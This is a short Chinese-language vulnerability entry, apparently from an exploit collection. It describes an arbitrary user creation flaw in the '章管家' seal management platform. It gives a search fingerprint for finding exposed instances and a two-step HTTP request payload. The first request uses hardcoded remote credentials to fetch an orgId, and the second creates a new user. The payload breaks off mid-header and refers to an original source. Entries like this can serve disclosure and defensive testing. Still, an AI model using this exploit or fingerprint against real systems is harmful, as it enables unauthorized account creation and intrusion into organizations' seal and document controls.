# 章管家UserCreateService存在任意用户添加漏洞

- **系统**：章管家　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app="章管家-印章智慧管理平台"`
- **请求**：`POST /api/personSeal/QueryAllOrgIdsService HTTP/1.1`

**请求体 / payload**
```
1.获取orgId
Host:
Content-Type: application/json
Sec-Fetch-User: ?1
Priority: u=0, i
{"bimRequestId":"1","bimRemotePwd":"123456","bimRemoteUser":"ZGJ","bimUid":"0","fullName":"123","orgId":"1","loginName":"123123","bimposition":"123"}
2.通过上一步获取的orgId添加用户
1. POST /api/personSeal/UserCreateService HTTP/1.1
2. Host:
3. User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:139.0) Gecko/20100101 Firefox/139.0
4. Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5. Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
6. Accept-Encoding: gzip, deflat…（脚本共 1025 字，完整版见原文）
```
- **预期**：200　|　—